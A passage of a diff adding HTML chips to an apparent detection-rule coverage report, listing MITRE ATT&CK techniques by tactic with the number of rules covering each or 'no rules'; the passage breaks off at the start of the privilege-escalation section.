+      <span class="chip miss" title="Reversible Encryption: no rules">T1556.005</span>
+      <span class="chip miss" title="Multi-Factor Authentication: no rules">T1556.006</span>
+      <span class="chip miss" title="Hybrid Identity: no rules">T1556.007</span>
+      <span class="chip miss" title="Network Provider DLL: no rules">T1556.008</span>
+      <span class="chip miss" title="Conditional Access Policies: no rules">T1556.009</span>
+      <span class="chip miss" title="ARP Cache Poisoning: no rules">T1557.002</span>
+      <span class="chip miss" title="Evil Twin: no rules">T1557.004</span>
+      <span class="chip miss" title="Golden Ticket: no rules">T1558.001</span>
+      <span class="chip miss" title="Silver Ticket: no rules">T1558.002</span>
+      <span class="chip miss" title="AS-REP Roasting: no rules">T1558.004</span>
+      <span class="chip miss" title="Ccache Files: no rules">T1558.005</span>
+      <span class="chip miss" title="Forge Web Credentials: no rules">T1606</span>
+      <span class="chip miss" title="Web Cookies: no rules">T1606.001</span>
+      <span class="chip miss" title="SAML Tokens: no rules">T1606.002</span>
+      <span class="chip miss" title="Multi-Factor Authentication Request Generation: no rules">T1621</span>
+    </div>
+    <h3>defense-impairment</h3>
+    <div class="chips">
+      <span class="chip ok" title="Modify Registry: 77 rule(s)">T1112</span>
+      <span class="chip ok" title="Rogue Domain Controller: 2 rule(s)">T1207</span>
+      <span class="chip ok" title="File and Directory Permissions Modification: 2 rule(s)">T1222</span>
+      <span class="chip ok" title="Windows Permissions: 3 rule(s)">T1222.001</span>
+      <span class="chip ok" title="Group Policy Modification: 6 rule(s)">T1484.001</span>
+      <span class="chip ok" title="Subvert Trust Controls: 1 rule(s)">T1553</span>
+      <span class="chip ok" title="Code Signing: 1 rule(s)">T1553.002</span>
+      <span class="chip ok" title="SIP and Trust Provider Hijacking: 1 rule(s)">T1553.003</span>
+      <span class="chip ok" title="Install Root Certificate: 7 rule(s)">T1553.004</span>
+      <span class="chip ok" title="Mark-of-the-Web Bypass: 6 rule(s)">T1553.005</span>
+      <span class="chip ok" title="Modify Authentication Process: 2 rule(s)">T1556</span>
+      <span class="chip ok" title="Password Filter DLL: 3 rule(s)">T1556.002</span>
+      <span class="chip ok" title="Network Address Translation Traversal: 1 rule(s)">T1599.001</span>
+      <span class="chip miss" title="Linux and Mac Permissions: no rules">T1222.002</span>
+      <span class="chip miss" title="Domain or Tenant Policy Modification: no rules">T1484</span>
+      <span class="chip miss" title="Trust Modification: no rules">T1484.002</span>
+      <span class="chip miss" title="Gatekeeper Bypass: no rules">T1553.001</span>
+      <span class="chip miss" title="Code Signing Policy Modification: no rules">T1553.006</span>
+      <span class="chip miss" title="Domain Controller Authentication: no rules">T1556.001</span>
+      <span class="chip miss" title="Pluggable Authentication Modules: no rules">T1556.003</span>
+      <span class="chip miss" title="Network Device Authentication: no rules">T1556.004</span>
+      <span class="chip miss" title="Reversible Encryption: no rules">T1556.005</span>
+      <span class="chip miss" title="Multi-Factor Authentication: no rules">T1556.006</span>
+      <span class="chip miss" title="Hybrid Identity: no rules">T1556.007</span>
+      <span class="chip miss" title="Network Provider DLL: no rules">T1556.008</span>
+      <span class="chip miss" title="Conditional Access Policies: no rules">T1556.009</span>
+      <span class="chip miss" title="Modify Cloud Compute Infrastructure: no rules">T1578</span>
+      <span class="chip miss" title="Create Snapshot: no rules">T1578.001</span>
+      <span class="chip miss" title="Create Cloud Instance: no rules">T1578.002</span>
+      <span class="chip miss" title="Delete Cloud Instance: no rules">T1578.003</span>
+      <span class="chip miss" title="Revert Cloud Instance: no rules">T1578.004</span>
+      <span class="chip miss" title="Modify Cloud Compute Configurations: no rules">T1578.005</span>
+      <span class="chip miss" title="Network Boundary Bridging: no rules">T1599</span>
+      <span class="chip miss" title="Weaken Encryption: no rules">T1600</span>
+      <span class="chip miss" title="Reduce Key Space: no rules">T1600.001</span>
+      <span class="chip miss" title="Disable Crypto Hardware: no rules">T1600.002</span>
+      <span class="chip miss" title="Modify System Image: no rules">T1601</span>
+      <span class="chip miss" title="Patch System Image: no rules">T1601.001</span>
+      <span class="chip miss" title="Downgrade System Image: no rules">T1601.002</span>
+      <span class="chip miss" title="Plist File Modification: no rules">T1647</span>
+      <span class="chip miss" title="Modify Cloud Resource Hierarchy: no rules">T1666</span>
+      <span class="chip miss" title="Disable or Modify Tools: no rules">T1685</span>
+      <span class="chip miss" title="Disable or Modify Windows Event Log: no rules">T1685.001</span>
+      <span class="chip miss" title="Disable or Modify Cloud Log: no rules">T1685.002</span>
+      <span class="chip miss" title="Modify or Spoof Tool UI: no rules">T1685.003</span>
+      <span class="chip miss" title="Disable or Modify Linux Audit System Log: no rules">T1685.004</span>
+      <span class="chip miss" title="Clear Windows Event Logs: no rules">T1685.005</span>
+      <span class="chip miss" title="Clear Linux or Mac System Logs: no rules">T1685.006</span>
+      <span class="chip miss" title="Disable or Modify System Firewall: no rules">T1686</span>
+      <span class="chip miss" title="Cloud Firewall: no rules">T1686.001</span>
+      <span class="chip miss" title="Network Device Firewall: no rules">T1686.002</span>
+      <span class="chip miss" title="Windows Host Firewall: no rules">T1686.003</span>
+      <span class="chip miss" title="Exploitation for Defense Impairment: no rules">T1687</span>
+      <span class="chip miss" title="Safe Mode Boot: no rules">T1688</span>
+      <span class="chip miss" title="Downgrade Attack: no rules">T1689</span>
+      <span class="chip miss" title="Prevent Command History Logging: no rules">T1690</span>
+    </div>
+    <h3>discovery</h3>
+    <div class="chips">
+      <span class="chip ok" title="System Service Discovery: 2 rule(s)">T1007</span>
+      <span class="chip ok" title="Application Window Discovery: 1 rule(s)">T1010</span>
+      <span class="chip ok" title="Query Registry: 9 rule(s)">T1012</span>
+      <span class="chip ok" title="System Network Configuration Discovery: 5 rule(s)">T1016</span>
+      <span class="chip ok" title="Remote System Discovery: 13 rule(s)">T1018</span>
+      <span class="chip ok" title="System Owner/User Discovery: 20 rule(s)">T1033</span>
+      <span class="chip ok" title="Network Sniffing: 6 rule(s)">T1040</span>
+      <span class="chip ok" title="Network Service Discovery: 10 rule(s)">T1046</span>
+      <span class="chip ok" title="System Network Connections Discovery: 4 rule(s)">T1049</span>
+      <span class="chip ok" title="Process Discovery: 3 rule(s)">T1057</span>
+      <span class="chip ok" title="Permission Groups Discovery: 3 rule(s)">T1069</span>
+      <span class="chip ok" title="Local Groups: 13 rule(s)">T1069.001</span>
+      <span class="chip ok" title="Domain Groups: 14 rule(s)">T1069.002</span>
+      <span class="chip ok" title="System Information Discovery: 15 rule(s)">T1082</span>
+      <span class="chip ok" title="File and Directory Discovery: 8 rule(s)">T1083</span>
+      <span class="chip ok" title="Account Discovery: 14 rule(s)">T1087</span>
+      <span class="chip ok" title="Local Account: 9 rule(s)">T1087.001</span>
+      <span class="chip ok" title="Domain Account: 20 rule(s)">T1087.002</span>
+      <span class="chip ok" title="Peripheral Device Discovery: 2 rule(s)">T1120</span>
+      <span class="chip ok" title="System Time Discovery: 2 rule(s)">T1124</span>
+      <span class="chip ok" title="Network Share Discovery: 4 rule(s)">T1135</span>
+      <span class="chip ok" title="Password Policy Discovery: 3 rule(s)">T1201</span>
+      <span class="chip ok" title="Browser Information Discovery: 4 rule(s)">T1217</span>
+      <span class="chip ok" title="Domain Trust Discovery: 17 rule(s)">T1482</span>
+      <span class="chip ok" title="System Checks: 1 rule(s)">T1497.001</span>
+      <span class="chip ok" title="Software Discovery: 4 rule(s)">T1518</span>
+      <span class="chip ok" title="Security Software Discovery: 3 rule(s)">T1518.001</span>
+      <span class="chip ok" title="Cloud Service Discovery: 1 rule(s)">T1526</span>
+      <span class="chip ok" title="System Language Discovery: 2 rule(s)">T1614.001</span>
+      <span class="chip ok" title="Group Policy Discovery: 5 rule(s)">T1615</span>
+      <span class="chip ok" title="Debugger Evasion: 1 rule(s)">T1622</span>
+      <span class="chip miss" title="Internet Connection Discovery: no rules">T1016.001</span>
+      <span class="chip miss" title="Wi-Fi Discovery: no rules">T1016.002</span>
+      <span class="chip miss" title="Cloud Groups: no rules">T1069.003</span>
+      <span class="chip miss" title="Email Account: no rules">T1087.003</span>
+      <span class="chip miss" title="Cloud Account: no rules">T1087.004</span>
+      <span class="chip miss" title="Virtualization/Sandbox Evasion: no rules">T1497</span>
+      <span class="chip miss" title="User Activity Based Checks: no rules">T1497.002</span>
+      <span class="chip miss" title="Time Based Checks: no rules">T1497.003</span>
+      <span class="chip miss" title="Backup Software Discovery: no rules">T1518.002</span>
+      <span class="chip miss" title="Cloud Service Dashboard: no rules">T1538</span>
+      <span class="chip miss" title="Cloud Infrastructure Discovery: no rules">T1580</span>
+      <span class="chip miss" title="Container and Resource Discovery: no rules">T1613</span>
+      <span class="chip miss" title="System Location Discovery: no rules">T1614</span>
+      <span class="chip miss" title="Cloud Storage Object Discovery: no rules">T1619</span>
+      <span class="chip miss" title="Device Driver Discovery: no rules">T1652</span>
+      <span class="chip miss" title="Log Enumeration: no rules">T1654</span>
+      <span class="chip miss" title="Virtual Machine Discovery: no rules">T1673</span>
+      <span class="chip miss" title="Local Storage Discovery: no rules">T1680</span>
+    </div>
+    <h3>execution</h3>
+    <div class="chips">
+      <span class="chip ok" title="Windows Management Instrumentation: 44 rule(s)">T1047</span>
+      <span class="chip ok" title="Scheduled Task/Job: 5 rule(s)">T1053</span>
+      <span class="chip ok" title="At: 2 rule(s)">T1053.002</span>
+      <span class="chip ok" title="Scheduled Task: 31 rule(s)">T1053.005</span>
+      <span class="chip ok" title="Command and Scripting Interpreter: 56 rule(s)">T1059</span>
+      <span class="chip ok" title="PowerShell: 178 rule(s)">T1059.001</span>
+      <span class="chip ok" title="Windows Command Shell: 26 rule(s)">T1059.003</span>
+      <span class="chip ok" title="Visual Basic: 23 rule(s)">T1059.005</span>
+      <span class="chip ok" title="Python: 3 rule(s)">T1059.006</span>
+      <span class="chip ok" title="JavaScript: 18 rule(s)">T1059.007</span>
+      <span class="chip ok" title="Software Deployment Tools: 4 rule(s)">T1072</span>
+      <span class="chip ok" title="Native API: 10 rule(s)">T1106</span>
+      <span class="chip ok" title="Trusted Developer Utilities Proxy Execution: 19 rule(s)">T1127</span>
+      <span class="chip ok" title="MSBuild: 1 rule(s)">T1127.001</span>
+      <span class="chip ok" title="Shared Modules: 1 rule(s)">T1129</span>
+      <span class="chip ok" title="BITS Jobs: 15 rule(s)">T1197</span>
+      <span class="chip ok" title="Exploitation for Client Execution: 12 rule(s)">T1203</span>
+      <span class="chip ok" title="User Execution: 5 rule(s)">T1204</span>
+      <span class="chip ok" title="Malicious Link: 2 rule(s)">T1204.001</span>
+      <span class="chip ok" title="Malicious File: 26 rule(s)">T1204.002</span>
+      <span class="chip ok" title="Malicious Copy and Paste: 6 rule(s)">T1204.004</span>
+      <span class="chip ok" title="Component Object Model: 3 rule(s)">T1559.001</span>
+      <span class="chip ok" title="Dynamic Data Exchange: 1 rule(s)">T1559.002</span>
+      <span class="chip ok" title="System Services: 1 rule(s)">T1569</span>
+      <span class="chip ok" title="Service Execution: 36 rule(s)">T1569.002</span>
+      <span class="chip ok" title="Hijack Execution Flow: 5 rule(s)">T1574</span>
+      <span class="chip ok" title="DLL: 79 rule(s)">T1574.001</span>
+      <span class="chip ok" title="Executable Installer File Permissions Weakness: 2 rule(s)">T1574.005</span>
+      <span class="chip ok" title="Path Interception by PATH Environment Variable: 2 rule(s)">T1574.007</span>
+      <span class="chip ok" title="Path Interception by Search Order Hijacking: 1 rule(s)">T1574.008</span>
+      <span class="chip ok" title="Services Registry Permissions Weakness: 11 rule(s)">T1574.011</span>
+      <span class="chip ok" title="COR_PROFILER: 2 rule(s)">T1574.012</span>
+      <span class="chip miss" title="Cron: no rules">T1053.003</span>
+      <span class="chip miss" title="Systemd Timers: no rules">T1053.006</span>
+      <span class="chip miss" title="Container Orchestration Job: no rules">T1053.007</span>
+      <span class="chip miss" title="AppleScript: no rules">T1059.002</span>
+      <span class="chip miss" title="Unix Shell: no rules">T1059.004</span>
+      <span class="chip miss" title="Network Device CLI: no rules">T1059.008</span>
+      <span class="chip miss" title="Cloud API: no rules">T1059.009</span>
+      <span class="chip miss" title="AutoHotKey &amp; AutoIT: no rules">T1059.010</span>
+      <span class="chip miss" title="Lua: no rules">T1059.011</span>
+      <span class="chip miss" title="Hypervisor CLI: no rules">T1059.012</span>
+      <span class="chip miss" title="Container CLI/API: no rules">T1059.013</span>
+      <span class="chip miss" title="ClickOnce: no rules">T1127.002</span>
+      <span class="chip miss" title="JamPlus: no rules">T1127.003</span>
+      <span class="chip miss" title="Malicious Image: no rules">T1204.003</span>
+      <span class="chip miss" title="Malicious Library: no rules">T1204.005</span>
+      <span class="chip miss" title="Inter-Process Communication: no rules">T1559</span>
+      <span class="chip miss" title="XPC Services: no rules">T1559.003</span>
+      <span class="chip miss" title="Launchctl: no rules">T1569.001</span>
+      <span class="chip miss" title="Systemctl: no rules">T1569.003</span>
+      <span class="chip miss" title="Dylib Hijacking: no rules">T1574.004</span>
+      <span class="chip miss" title="Dynamic Linker Hijacking: no rules">T1574.006</span>
+      <span class="chip miss" title="Path Interception by Unquoted Path: no rules">T1574.009</span>
+      <span class="chip miss" title="Services File Permissions Weakness: no rules">T1574.010</span>
+      <span class="chip miss" title="KernelCallbackTable: no rules">T1574.013</span>
+      <span class="chip miss" title="AppDomainManager: no rules">T1574.014</span>
+      <span class="chip miss" title="Container Administration Command: no rules">T1609</span>
+      <span class="chip miss" title="Deploy Container: no rules">T1610</span>
+      <span class="chip miss" title="Serverless Execution: no rules">T1648</span>
+      <span class="chip miss" title="Cloud Administration Command: no rules">T1651</span>
+      <span class="chip miss" title="Input Injection: no rules">T1674</span>
+      <span class="chip miss" title="ESXi Administration Command: no rules">T1675</span>
+      <span class="chip miss" title="Poisoned Pipeline Execution: no rules">T1677</span>
+    </div>
+    <h3>exfiltration</h3>
+    <div class="chips">
+      <span class="chip ok" title="Automated Exfiltration: 2 rule(s)">T1020</span>
+      <span class="chip ok" title="Exfiltration Over C2 Channel: 1 rule(s)">T1041</span>
+      <span class="chip ok" title="Exfiltration Over Alternative Protocol: 8 rule(s)">T1048</span>
+      <span class="chip ok" title="Exfiltration Over Symmetric Encrypted Non-C2 Protocol: 1 rule(s)">T1048.001</span>
+      <span class="chip ok" title="Exfiltration Over Unencrypted Non-C2 Protocol: 5 rule(s)">T1048.003</span>
+      <span class="chip ok" title="Exfiltration Over Web Service: 9 rule(s)">T1567</span>
+      <span class="chip ok" title="Exfiltration to Code Repository: 1 rule(s)">T1567.001</span>
+      <span class="chip ok" title="Exfiltration to Cloud Storage: 12 rule(s)">T1567.002</span>
+      <span class="chip miss" title="Exfiltration Over Other Network Medium: no rules">T1011</span>
+      <span class="chip miss" title="Exfiltration Over Bluetooth: no rules">T1011.001</span>
+      <span class="chip miss" title="Traffic Duplication: no rules">T1020.001</span>
+      <span class="chip miss" title="Scheduled Transfer: no rules">T1029</span>
+      <span class="chip miss" title="Data Transfer Size Limits: no rules">T1030</span>
+      <span class="chip miss" title="Exfiltration Over Asymmetric Encrypted Non-C2 Protocol: no rules">T1048.002</span>
+      <span class="chip miss" title="Exfiltration Over Physical Medium: no rules">T1052</span>
+      <span class="chip miss" title="Exfiltration over USB: no rules">T1052.001</span>
+      <span class="chip miss" title="Transfer Data to Cloud Account: no rules">T1537</span>
+      <span class="chip miss" title="Exfiltration to Text Storage Sites: no rules">T1567.003</span>
+      <span class="chip miss" title="Exfiltration Over Webhook: no rules">T1567.004</span>
+    </div>
+    <h3>impact</h3>
+    <div class="chips">
+      <span class="chip ok" title="Data Destruction: 6 rule(s)">T1485</span>
+      <span class="chip ok" title="Data Encrypted for Impact: 7 rule(s)">T1486</span>
+      <span class="chip ok" title="Service Stop: 9 rule(s)">T1489</span>
+      <span class="chip ok" title="Inhibit System Recovery: 18 rule(s)">T1490</span>
+      <span class="chip ok" title="Internal Defacement: 4 rule(s)">T1491.001</span>
+      <span class="chip ok" title="Resource Hijacking: 3 rule(s)">T1496</span>
+      <span class="chip ok" title="OS Exhaustion Flood: 1 rule(s)">T1499.001</span>
+      <span class="chip ok" title="Application or System Exploitation: 3 rule(s)">T1499.004</span>
+      <span class="chip ok" title="System Shutdown/Reboot: 3 rule(s)">T1529</span>
+      <span class="chip ok" title="Account Access Removal: 2 rule(s)">T1531</span>
+      <span class="chip ok" title="Data Manipulation: 1 rule(s)">T1565</span>
+      <span class="chip ok" title="Transmitted Data Manipulation: 1 rule(s)">T1565.002</span>
+      <span class="chip miss" title="Lifecycle-Triggered Deletion: no rules">T1485.001</span>
+      <span class="chip miss" title="Defacement: no rules">T1491</span>
+      <span class="chip miss" title="External Defacement: no rules">T1491.002</span>
+      <span class="chip miss" title="Firmware Corruption: no rules">T1495</span>
+      <span class="chip miss" title="Compute Hijacking: no rules">T1496.001</span>
+      <span class="chip miss" title="Bandwidth Hijacking: no rules">T1496.002</span>
+      <span class="chip miss" title="SMS Pumping: no rules">T1496.003</span>
+      <span class="chip miss" title="Cloud Service Hijacking: no rules">T1496.004</span>
+      <span class="chip miss" title="Network Denial of Service: no rules">T1498</span>
+      <span class="chip miss" title="Direct Network Flood: no rules">T1498.001</span>
+      <span class="chip miss" title="Reflection Amplification: no rules">T1498.002</span>
+      <span class="chip miss" title="Endpoint Denial of Service: no rules">T1499</span>
+      <span class="chip miss" title="Service Exhaustion Flood: no rules">T1499.002</span>
+      <span class="chip miss" title="Application Exhaustion Flood: no rules">T1499.003</span>
+      <span class="chip miss" title="Disk Wipe: no rules">T1561</span>
+      <span class="chip miss" title="Disk Content Wipe: no rules">T1561.001</span>
+      <span class="chip miss" title="Disk Structure Wipe: no rules">T1561.002</span>
+      <span class="chip miss" title="Stored Data Manipulation: no rules">T1565.001</span>
+      <span class="chip miss" title="Runtime Data Manipulation: no rules">T1565.003</span>
+      <span class="chip miss" title="Financial Theft: no rules">T1657</span>
+      <span class="chip miss" title="Email Bombing: no rules">T1667</span>
+    </div>
+    <h3>initial-access</h3>
+    <div class="chips">
+      <span class="chip ok" title="Valid Accounts: 9 rule(s)">T1078</span>
+      <span class="chip ok" title="Default Accounts: 1 rule(s)">T1078.001</span>
+      <span class="chip ok" title="Domain Accounts: 4 rule(s)">T1078.002</span>
+      <span class="chip ok" title="Local Accounts: 1 rule(s)">T1078.003</span>
+      <span class="chip ok" title="Replication Through Removable Media: 1 rule(s)">T1091</span>
+      <span class="chip ok" title="External Remote Services: 11 rule(s)">T1133</span>
+      <span class="chip ok" title="Drive-by Compromise: 2 rule(s)">T1189</span>
+      <span class="chip ok" title="Exploit Public-Facing Application: 22 rule(s)">T1190</span>
+      <span class="chip ok" title="Supply Chain Compromise: 1 rule(s)">T1195</span>
+      <span class="chip ok" title="Compromise Software Dependencies and Development Tools: 1 rule(s)">T1195.001</span>
+      <span class="chip ok" title="Compromise Software Supply Chain: 3 rule(s)">T1195.002</span>
+      <span class="chip ok" title="Hardware Additions: 3 rule(s)">T1200</span>
+      <span class="chip ok" title="Phishing: 8 rule(s)">T1566</span>
+      <span class="chip ok" title="Spearphishing Attachment: 17 rule(s)">T1566.001</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1078.004</span>
+      <span class="chip miss" title="Compromise Hardware Supply Chain: no rules">T1195.003</span>
+      <span class="chip miss" title="Trusted Relationship: no rules">T1199</span>
+      <span class="chip miss" title="Spearphishing Link: no rules">T1566.002</span>
+      <span class="chip miss" title="Spearphishing via Service: no rules">T1566.003</span>
+      <span class="chip miss" title="Spearphishing Voice: no rules">T1566.004</span>
+      <span class="chip miss" title="Content Injection: no rules">T1659</span>
+      <span class="chip miss" title="Wi-Fi Networks: no rules">T1669</span>
+    </div>
+    <h3>lateral-movement</h3>
+    <div class="chips">
+      <span class="chip ok" title="Remote Services: 4 rule(s)">T1021</span>
+      <span class="chip ok" title="Remote Desktop Protocol: 13 rule(s)">T1021.001</span>
+      <span class="chip ok" title="SMB/Windows Admin Shares: 33 rule(s)">T1021.002</span>
+      <span class="chip ok" title="Distributed Component Object Model: 12 rule(s)">T1021.003</span>
+      <span class="chip ok" title="SSH: 3 rule(s)">T1021.004</span>
+      <span class="chip ok" title="VNC: 1 rule(s)">T1021.005</span>
+      <span class="chip ok" title="Windows Remote Management: 10 rule(s)">T1021.006</span>
+      <span class="chip ok" title="Software Deployment Tools: 4 rule(s)">T1072</span>
+      <span class="chip ok" title="Replication Through Removable Media: 1 rule(s)">T1091</span>
+      <span class="chip ok" title="Exploitation of Remote Services: 7 rule(s)">T1210</span>
+      <span class="chip ok" title="Use Alternate Authentication Material: 1 rule(s)">T1550</span>
+      <span class="chip ok" title="Pass the Hash: 5 rule(s)">T1550.002</span>
+      <span class="chip ok" title="Pass the Ticket: 4 rule(s)">T1550.003</span>
+      <span class="chip ok" title="RDP Hijacking: 2 rule(s)">T1563.002</span>
+      <span class="chip ok" title="Lateral Tool Transfer: 4 rule(s)">T1570</span>
+      <span class="chip miss" title="Cloud Services: no rules">T1021.007</span>
+      <span class="chip miss" title="Direct Cloud VM Connections: no rules">T1021.008</span>
+      <span class="chip miss" title="Taint Shared Content: no rules">T1080</span>
+      <span class="chip miss" title="Internal Spearphishing: no rules">T1534</span>
+      <span class="chip miss" title="Application Access Token: no rules">T1550.001</span>
+      <span class="chip miss" title="Web Session Cookie: no rules">T1550.004</span>
+      <span class="chip miss" title="Remote Service Session Hijacking: no rules">T1563</span>
+      <span class="chip miss" title="SSH Hijacking: no rules">T1563.001</span>
+    </div>
+    <h3>persistence</h3>
+    <div class="chips">
+      <span class="chip ok" title="Logon Script (Windows): 3 rule(s)">T1037.001</span>
+      <span class="chip ok" title="Scheduled Task/Job: 5 rule(s)">T1053</span>
+      <span class="chip ok" title="At: 2 rule(s)">T1053.002</span>
+      <span class="chip ok" title="Scheduled Task: 31 rule(s)">T1053.005</span>
+      <span class="chip ok" title="Valid Accounts: 9 rule(s)">T1078</span>
+      <span class="chip ok" title="Default Accounts: 1 rule(s)">T1078.001</span>
+      <span class="chip ok" title="Domain Accounts: 4 rule(s)">T1078.002</span>
+      <span class="chip ok" title="Local Accounts: 1 rule(s)">T1078.003</span>
+      <span class="chip ok" title="Account Manipulation: 16 rule(s)">T1098</span>
+      <span class="chip ok" title="Modify Registry: 77 rule(s)">T1112</span>
+      <span class="chip ok" title="External Remote Services: 11 rule(s)">T1133</span>
+      <span class="chip ok" title="Local Account: 8 rule(s)">T1136.001</span>
+      <span class="chip ok" title="Domain Account: 3 rule(s)">T1136.002</span>
+      <span class="chip ok" title="Office Application Startup: 8 rule(s)">T1137</span>
+      <span class="chip ok" title="Office Test: 1 rule(s)">T1137.002</span>
+      <span class="chip ok" title="Outlook Forms: 1 rule(s)">T1137.003</span>
+      <span class="chip ok" title="Add-ins: 4 rule(s)">T1137.006</span>
+      <span class="chip ok" title="Browser Extensions: 2 rule(s)">T1176.001</span>
+      <span class="chip ok" title="BITS Jobs: 15 rule(s)">T1197</span>
+      <span class="chip ok" title="SQL Stored Procedures: 1 rule(s)">T1505.001</span>
+      <span class="chip ok" title="Transport Agent: 3 rule(s)">T1505.002</span>
+      <span class="chip ok" title="Web Shell: 20 rule(s)">T1505.003</span>
+      <span class="chip ok" title="IIS Components: 5 rule(s)">T1505.004</span>
+      <span class="chip ok" title="Terminal Services DLL: 1 rule(s)">T1505.005</span>
+      <span class="chip ok" title="System Firmware: 2 rule(s)">T1542.001</span>
+      <span class="chip ok" title="Bootkit: 1 rule(s)">T1542.003</span>
+      <span class="chip ok" title="Create or Modify System Process: 9 rule(s)">T1543</span>
+      <span class="chip ok" title="Windows Service: 37 rule(s)">T1543.003</span>
+      <span class="chip ok" title="Event Triggered Execution: 7 rule(s)">T1546</span>
+      <span class="chip ok" title="Change Default File Association: 5 rule(s)">T1546.001</span>
+      <span class="chip ok" title="Screensaver: 4 rule(s)">T1546.002</span>
+      <span class="chip ok" title="Windows Management Instrumentation Event Subscription: 11 rule(s)">T1546.003</span>
+      <span class="chip ok" title="Netsh Helper DLL: 4 rule(s)">T1546.007</span>
+      <span class="chip ok" title="Accessibility Features: 6 rule(s)">T1546.008</span>
+      <span class="chip ok" title="AppCert DLLs: 2 rule(s)">T1546.009</span>
+      <span class="chip ok" title="AppInit DLLs: 1 rule(s)">T1546.010</span>
+      <span class="chip ok" title="Application Shimming: 6 rule(s)">T1546.011</span>
+      <span class="chip ok" title="Image File Execution Options Injection: 2 rule(s)">T1546.012</span>
+      <span class="chip ok" title="PowerShell Profile: 3 rule(s)">T1546.013</span>
+      <span class="chip ok" title="Component Object Model Hijacking: 8 rule(s)">T1546.015</span>
+      <span class="chip ok" title="Boot or Logon Autostart Execution: 7 rule(s)">T1547</span>
+      <span class="chip ok" title="Registry Run Keys / Startup Folder: 31 rule(s)">T1547.001</span>
+      <span class="chip ok" title="Authentication Package: 1 rule(s)">T1547.002</span>
+      <span class="chip ok" title="Time Providers: 1 rule(s)">T1547.003</span>
+      <span class="chip ok" title="Winlogon Helper DLL: 2 rule(s)">T1547.004</span>
+      <span class="chip ok" title="Security Support Provider: 1 rule(s)">T1547.005</span>
+      <span class="chip ok" title="LSASS Driver: 1 rule(s)">T1547.008</span>
+      <span class="chip ok" title="Shortcut Modification: 4 rule(s)">T1547.009</span>
+      <span class="chip ok" title="Port Monitors: 4 rule(s)">T1547.010</span>
+      <span class="chip ok" title="Active Setup: 1 rule(s)">T1547.014</span>
+      <span class="chip ok" title="Login Items: 1 rule(s)">T1547.015</span>
+      <span class="chip ok" title="Compromise Host Software Binary: 3 rule(s)">T1554</span>
+      <span class="chip ok" title="Modify Authentication Process: 2 rule(s)">T1556</span>
+      <span class="chip ok" title="Password Filter DLL: 3 rule(s)">T1556.002</span>
+      <span class="chip miss" title="Boot or Logon Initialization Scripts: no rules">T1037</span>
+      <span class="chip miss" title="Login Hook: no rules">T1037.002</span>
+      <span class="chip miss" title="Network Logon Script: no rules">T1037.003</span>
+      <span class="chip miss" title="RC Scripts: no rules">T1037.004</span>
+      <span class="chip miss" title="Startup Items: no rules">T1037.005</span>
+      <span class="chip miss" title="Cron: no rules">T1053.003</span>
+      <span class="chip miss" title="Systemd Timers: no rules">T1053.006</span>
+      <span class="chip miss" title="Container Orchestration Job: no rules">T1053.007</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1078.004</span>
+      <span class="chip miss" title="Additional Cloud Credentials: no rules">T1098.001</span>
+      <span class="chip miss" title="Additional Email Delegate Permissions: no rules">T1098.002</span>
+      <span class="chip miss" title="Additional Cloud Roles: no rules">T1098.003</span>
+      <span class="chip miss" title="SSH Authorized Keys: no rules">T1098.004</span>
+      <span class="chip miss" title="Device Registration: no rules">T1098.005</span>
+      <span class="chip miss" title="Additional Container Cluster Roles: no rules">T1098.006</span>
+      <span class="chip miss" title="Additional Local or Domain Groups: no rules">T1098.007</span>
+      <span class="chip miss" title="Create Account: no rules">T1136</span>
+      <span class="chip miss" title="Cloud Account: no rules">T1136.003</span>
+      <span class="chip miss" title="Office Template Macros: no rules">T1137.001</span>
+      <span class="chip miss" title="Outlook Home Page: no rules">T1137.004</span>
+      <span class="chip miss" title="Outlook Rules: no rules">T1137.005</span>
+      <span class="chip miss" title="Software Extensions: no rules">T1176</span>
+      <span class="chip miss" title="IDE Extensions: no rules">T1176.002</span>
+      <span class="chip miss" title="Traffic Signaling: no rules">T1205</span>
+      <span class="chip miss" title="Port Knocking: no rules">T1205.001</span>
+      <span class="chip miss" title="Socket Filters: no rules">T1205.002</span>
+      <span class="chip miss" title="Server Software Component: no rules">T1505</span>
+      <span class="chip miss" title="vSphere Installation Bundles: no rules">T1505.006</span>
+      <span class="chip miss" title="Implant Internal Image: no rules">T1525</span>
+      <span class="chip miss" title="Pre-OS Boot: no rules">T1542</span>
+      <span class="chip miss" title="Component Firmware: no rules">T1542.002</span>
+      <span class="chip miss" title="ROMMONkit: no rules">T1542.004</span>
+      <span class="chip miss" title="TFTP Boot: no rules">T1542.005</span>
+      <span class="chip miss" title="Launch Agent: no rules">T1543.001</span>
+      <span class="chip miss" title="Systemd Service: no rules">T1543.002</span>
+      <span class="chip miss" title="Launch Daemon: no rules">T1543.004</span>
+      <span class="chip miss" title="Container Service: no rules">T1543.005</span>
+      <span class="chip miss" title="Unix Shell Configuration Modification: no rules">T1546.004</span>
+      <span class="chip miss" title="Trap: no rules">T1546.005</span>
+      <span class="chip miss" title="LC_LOAD_DYLIB Addition: no rules">T1546.006</span>
+      <span class="chip miss" title="Emond: no rules">T1546.014</span>
+      <span class="chip miss" title="Installer Packages: no rules">T1546.016</span>
+      <span class="chip miss" title="Udev Rules: no rules">T1546.017</span>
+      <span class="chip miss" title="Python Startup Hooks: no rules">T1546.018</span>
+      <span class="chip miss" title="Kernel Modules and Extensions: no rules">T1547.006</span>
+      <span class="chip miss" title="Re-opened Applications: no rules">T1547.007</span>
+      <span class="chip miss" title="Print Processors: no rules">T1547.012</span>
+      <span class="chip miss" title="XDG Autostart Entries: no rules">T1547.013</span>
+      <span class="chip miss" title="Domain Controller Authentication: no rules">T1556.001</span>
+      <span class="chip miss" title="Pluggable Authentication Modules: no rules">T1556.003</span>
+      <span class="chip miss" title="Network Device Authentication: no rules">T1556.004</span>
+      <span class="chip miss" title="Reversible Encryption: no rules">T1556.005</span>
+      <span class="chip miss" title="Multi-Factor Authentication: no rules">T1556.006</span>
+      <span class="chip miss" title="Hybrid Identity: no rules">T1556.007</span>
+      <span class="chip miss" title="Network Provider DLL: no rules">T1556.008</span>
+      <span class="chip miss" title="Conditional Access Policies: no rules">T1556.009</span>
+      <span class="chip miss" title="Power Settings: no rules">T1653</span>
+      <span class="chip miss" title="Exclusive Control: no rules">T1668</span>
+      <span class="chip miss" title="Cloud Application Integration: no rules">T1671</span>
+    </div>
+    <h3>privilege-escalation</h3>
+    <div class="chips">
+      <span class="chip ok" title="Logon Script (Windows): 3 rule(s)">T1037.001</span>
